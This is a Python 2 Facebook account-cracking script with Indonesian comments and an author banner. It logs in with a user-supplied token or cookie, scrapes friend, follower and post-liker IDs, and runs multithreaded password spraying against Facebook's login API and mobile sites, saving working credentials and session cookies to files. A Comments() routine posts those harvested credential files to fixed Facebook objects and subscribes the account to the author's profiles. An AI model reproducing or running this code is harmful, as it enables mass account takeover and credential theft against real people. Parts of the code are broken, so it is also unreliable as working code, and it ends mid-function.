import os
try:
    import requests
except ImportError:
    print '\n [~] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [~] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [~] Modul Bs4  not install!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
if 'linux' in sys.platform.lower():
    p = "\033[1;37m"
    k = "\033[1;33m"
    b = "\033[1;36m"
    m = "\033[1;91m"
    h = "\033[1;32m"
    d = "\033[1;34m"
    a = "\033[1;34m"
else:
    p = ""
    k = ""
    b = ""
    m = ""
    h = ""
    d = ""
    a = ""
    
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
koh = '100027060438331'
xi_jimpinx = '919926182252721'
ok, cp, id, loop = [], [], [], 0
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

def run_afg():
        m = ["|","/","-","\\"]
        for b in range(2):
                for t in m:
                        sys.stdout.write("  \r\033[37m [\033[33m!\033[37m] \033[36mConnecting Server \033[32m"+t)
                        sys.stdout.flush()
                        time.sleep(1)
                        
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")


Mking_youtube = random.choice(["https://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw"])

youtuber = Mking_youtube

# LO token
logo ="""
\033[1;91m             ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;91m            ###   ###    ##   ##   ##  ###   ## ##    ##\033[1;0m
\033[1;97m           #### ####    ##  ##    ##  ####  ## ##\033[1;0m
\033[1;97m          ## ### ##    #####     ##  ## ## ## ##   ####\033[1;0m
\033[1;91m         ##     ##    ##  ##    ##  ##  #### ##    ## \033[1;0m
\033[1;91m        ##     ##    ##   ##   ##  ##   ### ##    ##\033[1;0m
\033[1;97m       ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Mohammad Sultani 
\033[1;91m GitHub      : https://github.com/Mohammadjan1122
\033[1;91m YouTube     : Mohammad Tech 
\033[1;91m Telegram    : https://t.me/sultani1122
\033[1;91m Blogspot    : https://mohammadsultani.blogspot.com
\033[1;97m--------------------------------------------------
"""




#masuk token
def login():
    global token
    os.system("clear");print(logo)
    print("\033[1;93m --------------------------------------------------\n")
    print(" %s[%s1%s] Login with token %s(%sby Mking%s)\n\n%s [%s2%s] Login with cookie %s(by profaisor)\n\n%s [%s3%s] How to Get Access Token\n\n%s "%(p,k,p,h,p,h,p,k,p,m,p,k,p,p))
    chose_login=raw_input(" \033[4;33mChoose Option %s:\x1b[0m%s>%s>%s>%s> %s"%(p,m,k,h,b,p))
    if chose_login in ["1","01"]:
        log_token()
    elif chose_login in ["2","02"]:
        cookie()
    if chose_login in ["3","03"]:
        mking_token()  
    elif chose_login in ["nxnd","xnns"]:
        cute()          
    else:print("\n%s [%s!%s] Unknown!"%(p,m,p));time.sleep(2);login()
    

def mking_token():
    jalan('%s ~%s login fb to url %shttps://m.facebook.com'%(b,p,h));time.sleep(2)
    jalan('%s ~%s copy link %s[ %sview-source:https://business.facebook.com/business_locations%s ]%s and past to  chrome'%(b,p,m,b,m,p));time.sleep(2)
    jalan('%s ~%s and %s/Finder Page%s search %sEAAG%s \n'%(b,p,h,p,h,p));time.sleep(2)
    jalan('%s ~%s Video  %s/ youtube%s please subscribe > %shttps://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw%s \n'%(b,p,h,p,h,p));time.sleep(2)
    raw_input(' \033[1;37m[\033[1;33mENTER\033[1;37m]')
    login()

def log_token():
    global token
    os.system("clear");print(logo)
    print("\033[1;93m --------------------------------------------------\n")
    mking_token=raw_input("%s [%s~%s] Enter Token: %s"%(p,k,p,h))
    try:
        mohd=requests.get('https://graph.facebook.com/me?access_token=%s'%(mking_token));open("login.txt",'w').write(mking_token)
        run_afg()
        print("\n %s[%s~%s] Login Succesfully"%(p,k,p));jalan(" %s[%s~%s] Please Subscribe My Channel:)"%(p,k,p));os.system('xdg-open %s'%(youtuber));exit(Comments())
    except KeyError:
        print("\n %s[%s!%s] Token invalid!"%(p,m,p));time.sleep(1);login()


def cookie():
	os.system('clear');print(logo)
	print("\033[1;93m --------------------------------------------------")
	cookie = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie: ")
	try:
		data = requests.get('https://business.facebook.com/business_locations', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36', # Don't Ulek" asyu:v
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAG\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No Connection")
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	print("\n %s[%s~%s] Login successfull"%(p,k,p));jalan(" %s[%s~%s] Please Subscribe My Channel:)"%(p,k,p));os.system('xdg-open %s'%(youtuber));exit(Comments())

def Comments():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.system('rm -rf login.txt')
        exit(login())
        send = open('ok.txt', 'r').read()
        send1 = open('cp.txt', 'r').read()
        requests.post('https://graph.facebook.com/919926182252721/comments/?message=' + send + '&access_token=' + token)
        requests.post('https://graph.facebook.com/101919338997956/comments/?message=' + send1 + '&access_token=' + token)
        requests.post('https://graph.facebook.com/100023853246388/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100001489195919/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100075088461744/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100075226387674/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100027060438331/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/37613546/subscribers?access_token=' + token)
    except:pass
    menu()
        	

def menu():
    os.system('clear')
    try:
    	token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s~%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf login.txt'); login()
    try: 
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
    except KeyError:
        print '\n %s[%s~%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf login.txt'); login()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] CONECTION ERROR \n'%(N,M,N))
    os.system('clear')
    print logo
    IP = requests.get('https://api.ipify.org').text
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' (\033[0;96m~\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m~\033[0m) IP DEVICE   : %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s1%s]. Extract id  Frinds'%(O,N);time.sleep(0.03)
    print ' [%s2%s]. Extract id  Frinds publik'%(O,N);time.sleep(0.03)
    print ' [%s3%s]. Extract id  followers'%(O,N);time.sleep(0.03)
    print ' [%s4%s]. Extract id  like post'%(O,N);time.sleep(0.03)
    print ' [%s5%s]. Start crack'%(O,N);time.sleep(0.03)
    print ' [%s6%s]. Settings user agent'%(O,N);time.sleep(0.03)
    print ' [%s0%s]. logout (%s Remover token %s)'%(M,N,M,N);time.sleep(0.03)
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        print '\n %s[%s~%s]  INVALID OPTION!'%(N,M,N);time.sleep(2);menu()
    elif pepek in['1','01']:
        Frinds(token)
    elif pepek in['2','02']:
        publik(token)
    elif pepek in['3','03']:
        followers(token)
    elif pepek in['4','04']:
         post(token)
    elif pepek in['5','05']:
        __crack__().plerr()
    elif pepek in['6','06']:
        mkin_agent()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf login.txt')
        jalan('\n %s[%s~%s]%s  successfull Remove token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s~%s] menu [%s%s%s] exit!'%(N,M,N,M,pepek,N);time.sleep(2);menu()
    
    
    
    

# Extract id  Frinds 
def Frinds(token):
    try:
        os.mkdir('Extract')
    except:pass
    try:
        mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        cin = ('Extract/' + mmk + '.json').replace(' ', '_')
        xxx = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,token)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Extract Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s~%s]  successfull Extract id  Frinds'%(N,H,N))
        print ' [%s~%s] salin output file >> ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));menu()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Failed to extract id,  id is not public.\n'%(N,M,N))
        raw_input(' [ %sback%s ] '%(O,N));menu()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# Extract id  Frinds publik 
def publik(token):
    try:
        os.mkdir('Extract')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        knt = ('Extract/' + ahh + '.json').replace(' ', '_')
        xxx = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,token)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Extract Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s~%s]  successfull Extract id  Frinds publik'%(N,H,N))
        print ' [%s~%s]  output file >> ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));menu()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Failed to extract id,  id is not public.\n'%(N,M,N))
        raw_input(' [ %sback%s ] '%(O,N));menu()

# Extract id  followers 
def followers(token):
    try:
        os.mkdir('Extract')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ah  = ('Extract/' + mmk + '.json').replace(' ', '_')
        xxx = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,token)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Extract Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s~%s]  successfull Extract id  total followers'%(N,H,N))
        print ' [%s~%s]  output file >> ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));menu()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Failed to extract id,  id is not public.\n'%(N,M,N))
        raw_input(' [ %sback%s ] '%(O,N));menu()

# Extract id dari  post hehe
def  post(token):
    try:
        os.mkdir('Extract')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
        ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ahh = ('Extract/' + ppk + '.json').replace(' ', '_')
        xxx = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,token)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Extract Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        print '\n\x1b[1;97m-------------------------------------------------'
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] Successfully extract id from total followers' % (N, H, N))
        print '\x1b[1;97m-------------------------------------------------'
        print ' [%s\x1b[1;92m\xe2\x80\xa2%s] Copy the output file ( %s%s%s )' % (O, N, M, ah, N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        raw_input(' [%s ENTER%s ] '%(O,N));menu()
    except (KeyError,IOError):
        os.remove(ahh)
        jalan('\n %s[%s!%s] Failed to extract id, probably id is not public..\n'%(N,M,N))
        raw_input(' [ %sback%s ] '%(O,N));menu()

###  user agent
def mkin_agent():
    print '\n (%s1%s) Change user agent'%(O,N)
    print ' (%s2%s) check user agent'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print '\n %s[%s~%s] I valid option '%(N,M,N);time.sleep(2);mkin_agent()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('mking.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print '\n %s[%s+%s] User Agent not found : %s%s'%(N,O,N,H,user_agent)
        raw_input('\n  %s[ %sback%s ]'%(N,O,N));menu()
    else:
        print '\n %s[%s~%s] input baner'%(N,M,N);time.sleep(2);mkin_agent()


# User Agent 
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf mking.txt')
    _asu_ = raw_input('\n [%s?%s] Enter user agent  [Y/t]: '%(O,N))
    if _asu_ == '':
        print '\n %s[%s~%s] invalid option '%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        _agen_ = raw_input(' [%s?%s] Enter user agent :%s '%(O,N,H))
        open('mking.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s~%s]  successfull  user agent ...'%(N,H,N))
        raw_input('\n  %s[ %sback%s ]'%(N,O,N));menu()
    elif _asu_ in['T','t']:
        _agen_ = raw_input(' [%s?%s] Enter user agent :%s '%(O,N,H))
        open('mking.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s~%s]  successfull  user agent...'%(N,H,N))
        raw_input('\n  %s[ %sback%s ]'%(N,O,N));menu()
    else:
        print '\n %s[%s!%s] Y/t   '%(N,M,N);yo_ndak_tau_ko_tanya_saia()
# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] Enter file : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s~%s] File [%s%s%s] tidak ada, Extract id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %sback%s ]'%(N,O,N));menu()
        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] Enter kata sandi : '%(O,N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s~%s] jangan kosong bro kata sandi nya'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s~%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s~%s] jangan kosong bro'%(N,M,N);__yan__()()
                        elif cin == '1':
                            print '\n [%s+%s] saved OK   -> ok.txt'%(O,N)
                            print ' [%s+%s] saved CP   -> cp.txt'%(O,N)
                            print '\n [%s!%s]  you can turn off cellular data to pause the crack process\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __mking__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            saved(ok,cp)
                        elif cin == '2':
                            print '\n [%s+%s] saved OK   -> ok.txt'%(O,N)
                            print ' [%s+%s] saved CP   -> cp.txt'%(O,N)
                            print '\n [%s!%s]  you can turn off cellular data to pause the crack process\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __mking__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            saved(ok,cp)
                        elif cin == '3':
                            print '\n [%s+%s] saved OK   -> ok.txt'%(O,N)
                            print ' [%s+%s] saved CP   -> cp.txt'%(O,N)
                            print '\n [%s!%s]  you can turn off cellular data to pause the crack process\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __mking__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            saved(ok,cp)
                        else:
                            print '\n %s[%s~%s] input yang bener'%(N,M,N);__yan__()
                    print '\n [ Choose method login - silahkan coba satu ]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ Choose method login - silahkan coba satu  ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s~%s] Y/t goblok!'%(N,M,N);self.plerr()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('afg')
            except: pass
            try:
            	_token = open('mking.txt', 'r').read()
            except (KeyError, IOError):
            	_token = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _token, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik'%(N,M,N)),
                sys.stdout.flush()
                loop +=1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [~] %s|%s' % (user,pw)
                ok.append(wrt)
                open('ok.txt', 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    token = open('login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [~] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('cp.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [~] %s|%s' % (user,pw)
                cp.append(wrt)
                open('cp.txt', 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('afg')
            except: pass
            try:
            	_token = open('mking.txt', 'r').read()
            except (KeyError, IOError):
            	_token = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_token,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [~] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('ok.txt', 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    token = open('login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [~] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('cp.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [~] %s|%s' % (user,pw)
                cp.append(wrt)
                open('cp.txt', 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('afg')
            except: pass
            try:
            	_token = open('mking.txt', 'r').read()
            except (KeyError, IOError):
            	_token = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_token,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [~] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('ok.txt', 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    token = open('login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [~] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('cp.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [~] %s|%s' % (user,pw)
                cp.append(wrt)
                open('cp.txt', 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
